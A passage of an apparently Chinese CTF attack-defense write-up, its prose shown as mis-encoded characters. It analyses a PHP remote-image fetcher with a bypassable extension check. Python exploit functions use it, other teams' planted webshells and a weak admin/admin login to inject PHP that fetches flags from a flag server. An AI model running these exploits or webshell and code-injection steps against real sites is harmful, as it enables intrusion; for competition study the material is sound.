class="comment">//Ajaxæäº¤çš„ç½‘å€å†…å®¹ä¸­å¦‚æœåŒ…å«äº†&amp;ç¬¦å·ï¼Œä¸Šè¿°å‡½æ•°ä¼šå°†å…¶è½¬æˆ&amp;amp;å¯¼è‡´åœ°å€è§£æä¸å¯¹ï¼Œè¿™é‡Œè¦è½¬å›æ¥</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&amp;amp;&quot;</span>, <span class="string">&quot;&amp;&quot;</span>, <span class="variable">$uri</span>);</span><br></pre></td></tr></table></figure><p>ä¼ å…¥è¿™é‡Œçš„upfileå˜é‡ï¼ˆæ³¨æ„è¿™é‡ŒGETå’ŒPOSTéƒ½å¯ä»¥ï¼Œåº”è¯¥æ˜¯æœ‰é…ç½®è¿‡æˆ–è€…èµ‹å€¼è¿‡ï¼Œæˆ‘æ²¡ç»†æ‰¾ï¼‰ä½¿ç”¨htmlspecialcharsè¿‡æ»¤äº†ä¸€æ¬¡ï¼Œèµ°äº†ä¸€æ¬¡å­—ç¬¦ä¸²æ›¿æ¢ï¼Œç„¶åè¿›å…¥å‡½æ•°getRemoteImage()ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRemoteImage</span>(<span class="params"><span class="variable">$uri</span></span>) </span>&#123;</span><br><span class="line"><span class="comment">//å¿½ç•¥æŠ“å–æ—¶é—´é™åˆ¶</span></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//è¿œç¨‹æŠ“å–å›¾ç‰‡é…ç½®</span></span><br><span class="line"><span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&quot;savePath&quot;</span> =&gt; <span class="string">&quot;../../..&quot;</span> . UPLOADPATH, <span class="comment">//ä¿å­˜è·¯å¾„</span></span><br><span class="line"><span class="string">&quot;fileType&quot;</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.png&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.bmp&quot;</span>), <span class="comment">//æ–‡ä»¶å…è®¸æ ¼å¼</span></span><br><span class="line"><span class="string">&quot;fileSize&quot;</span> =&gt; <span class="number">3000</span>, <span class="comment">//æ–‡ä»¶å¤§å°é™åˆ¶ï¼Œå•ä½KB</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//ue_separate_ue  ueç”¨äºä¼ é€’æ•°æ®åˆ†å‰²ç¬¦å·</span></span><br><span class="line"><span class="variable">$imgUrls</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;ue_separate_ue&quot;</span>, <span class="variable">$uri</span>);</span><br><span class="line"><span class="variable">$tmpNames</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$imgUrls</span> <span class="keyword">as</span> <span class="variable">$imgUrl</span>) &#123;</span><br><span class="line"><span class="comment">//httpå¼€å¤´éªŒè¯</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$imgUrl</span>, <span class="string">&quot;http&quot;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è·å–è¯·æ±‚å¤´</span></span><br><span class="line"><span class="variable">$heads</span> = <span class="title function_ invoke__">get_headers</span>(<span class="variable">$imgUrl</span>);</span><br><span class="line"><span class="comment">//æ­»é“¾æ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="number">0</span>], <span class="string">&quot;200&quot;</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="number">0</span>], <span class="string">&quot;OK&quot;</span>))) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ ¼å¼éªŒè¯(æ‰©å±•åéªŒè¯å’ŒContent-TypeéªŒè¯)</span></span><br><span class="line"><span class="variable">$fileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$imgUrl</span>, <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileType</span>, <span class="variable">$config</span>[<span class="string">&#x27;fileType&#x27;</span>]) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="string">&#x27;Content-Type&#x27;</span>], <span class="string">&quot;image&quot;</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ‰“å¼€è¾“å‡ºç¼“å†²åŒºå¹¶è·å–è¿œç¨‹å›¾ç‰‡</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;http&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;follow_location&#x27;</span> =&gt; <span class="literal">false</span>, // don<span class="string">&#x27;t follow redirects</span></span><br><span class="line"><span class="string">),</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">//è¯·ç¡®ä¿php.iniä¸­çš„fopen wrapperså·²ç»æ¿€æ´»</span></span><br><span class="line"><span class="string">readfile($imgUrl, false, $context);</span></span><br><span class="line"><span class="string">$img = ob_get_contents();</span></span><br><span class="line"><span class="string">ob_end_clean();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//å¤§å°éªŒè¯</span></span><br><span class="line"><span class="string">$uriSize = strlen($img); //å¾—åˆ°å›¾ç‰‡å¤§å°</span></span><br><span class="line"><span class="string">$allowSize = 1024 * $config[&#x27;</span>fileSize<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">if ($uriSize &gt; $allowSize) &#123;</span></span><br><span class="line"><span class="string">array_push($tmpNames, &quot;error&quot;);</span></span><br><span class="line"><span class="string">continue;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//åˆ›å»ºä¿å­˜ä½ç½®</span></span><br><span class="line"><span class="string">$savePath = $config[&#x27;</span>savePath<span class="string">&#x27;];</span></span><br><span class="line"><span class="string">$ymd = date(&quot;Ymd&quot;);</span></span><br><span class="line"><span class="string">$savePath .= &quot;Image/&quot; . $ymd . &quot;/&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (!is_dir($savePath)) &#123;</span></span><br><span class="line"><span class="string">mkdir($savePath, 0777);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">//å†™å…¥æ–‡ä»¶</span></span><br><span class="line"><span class="string">$tmpName = $savePath . rand(1, 10000) . time() . strrchr($imgUrl, &#x27;</span>.<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">$fp2 = @fopen($tmpName, &quot;a&quot;);</span></span><br><span class="line"><span class="string">fwrite($fp2, $img);</span></span><br><span class="line"><span class="string">fclose($fp2);</span></span><br><span class="line"><span class="string">array_push($tmpNames, $tmpName);</span></span><br><span class="line"><span class="string">&#125; catch (Exception $e) &#123;</span></span><br><span class="line"><span class="string">array_push($tmpNames, &quot;error&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">/**</span></span><br><span class="line"><span class="string"> * è¿”å›æ•°æ®æ ¼å¼</span></span><br><span class="line"><span class="string"> * &#123;</span></span><br><span class="line"><span class="string"> *   &#x27;</span>url<span class="string">&#x27;   : &#x27;</span>æ–°åœ°å€ä¸€ue_separate_ueæ–°åœ°å€äºŒue_separate_ueæ–°åœ°å€ä¸‰<span class="string">&#x27;,</span></span><br><span class="line"><span class="string"> *   &#x27;</span>srcUrl<span class="string">&#x27;: &#x27;</span>åŸå§‹åœ°å€ä¸€ue_separate_ueåŸå§‹åœ°å€äºŒue_separate_ueåŸå§‹åœ°å€ä¸‰<span class="string">&#x27;ï¼Œ</span></span><br><span class="line"><span class="string"> *   &#x27;</span>tip<span class="string">&#x27;   : &#x27;</span>çŠ¶æ€æç¤º<span class="string">&#x27;</span></span><br><span class="line"><span class="string"> * &#125;</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$url = ROOTPATH . &#x27;</span>/<span class="string">&#x27; . strrchr(implode(&quot;ue_separate_ue&quot;, $tmpNames), &#x27;</span>upload<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo &quot;&#123;&#x27;</span>url<span class="string">&#x27;:&#x27;</span><span class="string">&quot; . <span class="subst">$url</span> . &quot;</span><span class="string">&#x27;,&#x27;</span>tip<span class="string">&#x27;:&#x27;</span>è¿œç¨‹å›¾ç‰‡æŠ“å–æˆåŠŸï¼<span class="string">&#x27;,&#x27;</span>srcUrl<span class="string">&#x27;:&#x27;</span><span class="string">&quot; . <span class="subst">$uri</span> . &quot;</span><span class="string">&#x27;&#125;&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>å…ˆæ˜¯å†™å®šäº†æ–‡ä»¶ä¸Šä¼ ç›®å½•åœ¨uploadä¸‹ï¼Œåˆ†åˆ«åšäº†httpè¯·æ±‚å¤´é™åˆ¶ã€æ£€æµ‹è®¿é—®æ˜¯å¦200ã€ä»¥åŠé™åˆ¶äº†è¯»å–çš„æ–‡ä»¶çš„æ–‡ä»¶æ‹“å±•åï¼ˆè¿™é‡Œå¯ä»¥é€šè¿‡getæäº¤å‚æ•°ç»•è¿‡ï¼‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$imgUrl</span>, <span class="string">&quot;http&quot;</span>) !== <span class="number">0</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è·å–è¯·æ±‚å¤´</span></span><br><span class="line"><span class="variable">$heads</span> = <span class="title function_ invoke__">get_headers</span>(<span class="variable">$imgUrl</span>);</span><br><span class="line"><span class="comment">//æ­»é“¾æ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span> (!(<span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="number">0</span>], <span class="string">&quot;200&quot;</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="number">0</span>], <span class="string">&quot;OK&quot;</span>))) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ ¼å¼éªŒè¯(æ‰©å±•åéªŒè¯å’ŒContent-TypeéªŒè¯)</span></span><br><span class="line"><span class="variable">$fileType</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$imgUrl</span>, <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$fileType</span>, <span class="variable">$config</span>[<span class="string">&#x27;fileType&#x27;</span>]) || <span class="title function_ invoke__">stristr</span>(<span class="variable">$heads</span>[<span class="string">&#x27;Content-Type&#x27;</span>], <span class="string">&quot;image&quot;</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">array_push</span>(<span class="variable">$tmpNames</span>, <span class="string">&quot;error&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥é€šè¿‡ç¼“å†²åŒºè¯»å…¥æ–‡ä»¶å†…å®¹ï¼Œä¾ç„¶æ˜¯ç”¨readfileè¯»å–äº†è¿œç¨‹å¹¶å†™å…¥$imgï¼Œå¹¶æœ€åå†™å…¥æ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ‰“å¼€è¾“å‡ºç¼“å†²åŒºå¹¶è·å–è¿œç¨‹å›¾ç‰‡</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="variable">$context</span> = <span class="title function_ invoke__">stream_context_create</span>(</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;http&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;follow_location&#x27;</span> =&gt; <span class="literal">false</span>, // don<span class="string">&#x27;t follow redirects</span></span><br><span class="line"><span class="string">),</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">);</span></span><br><span class="line"><span class="string">//è¯·ç¡®ä¿php.iniä¸­çš„fopen wrapperså·²ç»æ¿€æ´»</span></span><br><span class="line"><span class="string">readfile($imgUrl, false, $context);</span></span><br><span class="line"><span class="string">$img = ob_get_contents();</span></span><br><span class="line"><span class="string">ob_end_clean();</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„æ–‡ä»¶åä¼šé€šè¿‡æ—¶é—´å‡½æ•°è·å–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//åˆ›å»ºä¿å­˜ä½ç½®</span></span><br><span class="line"><span class="variable">$savePath</span> = <span class="variable">$config</span>[<span class="string">&#x27;savePath&#x27;</span>];</span><br><span class="line"><span class="variable">$ymd</span> = <span class="title function_ invoke__">date</span>(<span class="string">&quot;Ymd&quot;</span>);</span><br><span class="line"><span class="variable">$savePath</span> .= <span class="string">&quot;Image/&quot;</span> . <span class="variable">$ymd</span> . <span class="string">&quot;/&quot;</span>;</span><br></pre></td></tr></table></figure><p>åŒç†expä¹Ÿæ˜¯å¯ä»¥ç›´æ¥è·å–æ—¶é—´çš„ï¼Œä½†æ˜¯æœ‰æ›´å¿«çš„æ–¹æ³•ï¼Œä¸Šä¼ æ–‡ä»¶åä¼šè¿”å›è¿œç¨‹æ–‡ä»¶æŠ“å–æˆåŠŸçš„æç¤º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#123;&#x27;url&#x27;:&#x27;&quot;</span> . <span class="variable">$url</span> . <span class="string">&quot;&#x27;,&#x27;tip&#x27;:&#x27;è¿œç¨‹å›¾ç‰‡æŠ“å–æˆåŠŸï¼&#x27;,&#x27;srcUrl&#x27;:&#x27;&quot;</span> . <span class="variable">$uri</span> . <span class="string">&quot;&#x27;&#125;&quot;</span>; </span><br></pre></td></tr></table></figure><p>æŒ‰ç…§è¿™ä¸ªæ ¼å¼æ­£åˆ™åŒ¹é…å³å¯ï¼Œexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp3</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp3 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># é»‘åå•æ£€æµ‹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp3.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># è¯·æ±‚</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;upfile&quot;</span>: <span class="string">f&quot;http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&amp;123=aurora.gif&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res1 = exp3.request(url=ip + <span class="string">&quot;getRemoteImage.php&quot;</span>, method=<span class="string">&quot;GET&quot;</span>, params=params)</span><br><span class="line">    path = re.findall(<span class="string">&quot;&#x27;url&#x27;:&#x27;([\s\S]*)&#x27;,&#x27;tip&#x27;&quot;</span>, res1.text)[<span class="number">0</span>]</span><br><span class="line">    res2 = exp3.request(url=ip + path, method=<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    <span class="comment"># æäº¤ flag</span></span><br><span class="line">    exp3.submit(res=res2, pid=pid) </span><br></pre></td></tr></table></figure><p>ä¸‰ç‚¹å·¦å³å‡ºçš„ï¼Œå¤§æ¦‚è¿™ä¸ªæ—¶å€™é˜Ÿä¼çš„çˆ·çˆ·å·²ç»æŠŠå¯ä¿¡è®¡ç®—AKäº†ï¼Œäºæ˜¯æˆ‘ä»¬åˆç¥å¥‡çš„æ‹‰å›äº†ç¬¬å››åã€‚</p><p>è¿™æ®µæ—¶é—´åˆå‡ºäº†æ’æ›²ï¼Œæœ‰ä¸€åªæ‰“å…¨åœºçš„é˜Ÿä¼æŠŠå¾ˆå¤šé¶æœºéƒ½æ‰“æŒ‚äº†ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯å…¶ä¸­ä¹‹ä¸€ï¼Œåæ¥å®•æœºæ²¡è¡¥åˆ†ï¼Œæˆ‘ä»¬åˆé‡ç½®äº†ï¼Œè¡€äºä¸€æ³¢ã€‚</p><p>åé¢å°±æ¯”è¾ƒæ— èŠäº†ï¼Œæ£€æŸ¥å„ä¸ªé˜Ÿä¼å‘æ¥çš„æµé‡æ‰¾expï¼Œè¿™ä¸ªæ—¶å€™å¤§æ¦‚ä¹Ÿæ²¡æœ‰æ–°çš„expäº†ï¼Œå€’æ˜¯åœ¨é¶æœºé‡Œæ‰¾åˆ°äº†åˆ«äººç§çš„é©¬ï¼Œæœ‰å‡ ä¸ªæ˜¯æœ‰åŠ å¯†çš„ï¼Œæœ‰å‡ ä¸ªæ˜¯ç›´æ¥è°ƒç”¨file_get_contentçš„ï¼Œè¿™å‡ ä¸ªæˆ‘ä»¬éƒ½åˆ©ç”¨ä¸ä¸Šï¼Œä½†æ˜¯æ‰¾åˆ°äº†ä¸¤ä¸ªç›´æ¥æ˜æ–‡å¼±å¯†ç çš„ï¼Œå¾ˆèˆ’æœçš„ä¸Šè½¦äº†ã€‚</p><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp6</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp6 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># é»‘åå•æ£€æµ‹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp6.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># è¯·æ±‚</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;1&quot;</span>: <span class="string">f&quot;var_dump(file_get_contents(&#x27;http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&#x27;));&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = exp6.request(url=ip + <span class="string">&quot;.1.php&quot;</span>, method=<span class="string">&quot;POST&quot;</span>, data=data)</span><br><span class="line">    <span class="comment"># æäº¤ flag</span></span><br><span class="line">    exp6.submit(res=res, pid=pid)</span><br></pre></td></tr></table></figure><p>exp2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp7</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp7 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># é»‘åå•æ£€æµ‹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp7.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># è¯·æ±‚</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;a&quot;</span>: <span class="string">f&quot;echo file_get_contents(&#x27;http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&#x27;)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = exp7.request(url=ip + <span class="string">&quot;cache/blog_x5tar.phtml&quot;</span>, method=<span class="string">&quot;GET&quot;</span>, params=params)</span><br><span class="line">    <span class="comment"># æäº¤ flag</span></span><br><span class="line">    exp7.submit(res=res, pid=pid) </span><br></pre></td></tr></table></figure><p>æ°äº†ä¸€æ³¢çº¢åˆ©ï¼Œæ„Ÿè°¢å¤§å¸ˆå‚…ä»¬é€flagã€‚</p><p>æœ€ååŒ—é‚®çš„å¸ˆå‚…ä»¬å›¤äº†ä¸€ä¸ªå¯ä¿¡è®¡ç®—çš„flagæ‰“åˆ°äº†ç¬¬äº”åï¼Œæˆ‘ä»¬æœ€åæ˜¯ç¬¬å…­åï¼Œå¸ˆå‚…ä»¬tqlã€‚</p><hr><p>è¡¥å……ä¸€ä¸‹ï¼Œåœ¨çœ‹åˆ°äº†<a href="https://www.bilibili.com/video/BV1F44y1m7Cz">Xennyå¸ˆå‚…å¯¹CISCNçš„å¤ç›˜</a>ä¹‹åï¼Œåˆå‘ç°äº†Web3è‡ªå·±æ²¡æœ‰æ‰¾åˆ°çš„expï¼Œè¿™é‡Œè®¾ä¸ºexp8ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp8</span>(<span class="params">ip, eid, pid</span>):</span><br><span class="line">    exp8 = models.Exp(eid=eid)</span><br><span class="line">    <span class="comment"># é»‘åå•æ£€æµ‹</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exp8.check(ip):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-]blacklist&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># è¯·æ±‚ 1</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;act&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pwd&#x27;</span>: <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    exp8.request(url=ip + <span class="string">&#x27;admini/login.php&#x27;</span>, method=<span class="string">&quot;GET&quot;</span>, params=params)</span><br><span class="line">    <span class="comment"># è¯·æ±‚ 2</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;fileName&#x27;</span>: <span class="string">&#x27;./index/article/article_3.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;fileCode&#x27;</span>: <span class="string">f&#x27;&#x27;&#x27;&lt;?php print_r(file_get_contents(&#x27;http://flagserver.top/index.php?token=<span class="subst">&#123;database.TOKEN[pid][<span class="string">&#x27;get_token&#x27;</span>]&#125;</span>&#x27;))?&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;system&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;changeskin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;saveFileCode&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    exp8.request(url=ip + <span class="string">&#x27;admini/index.php&#x27;</span>, method=<span class="string">&quot;POST&quot;</span>, params=params, data=data)</span><br><span class="line">    <span class="comment"># è¯·æ±‚ 3</span></span><br><span class="line">    res = exp8.request(url=ip + <span class="string">&#x27;skins/doccms_model_1/index/article/article_3.php&#x27;</span>, method=<span class="string">&quot;GET&quot;</span>)</span><br><span class="line">    <span class="comment"># æäº¤ flag</span></span><br><span class="line">    exp8.submit(res, pid=pid)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„é€»è¾‘æ¯”è¾ƒæ¸…æ™°ï¼Œé¦–å…ˆé€šè¿‡å¼±å¯†ç 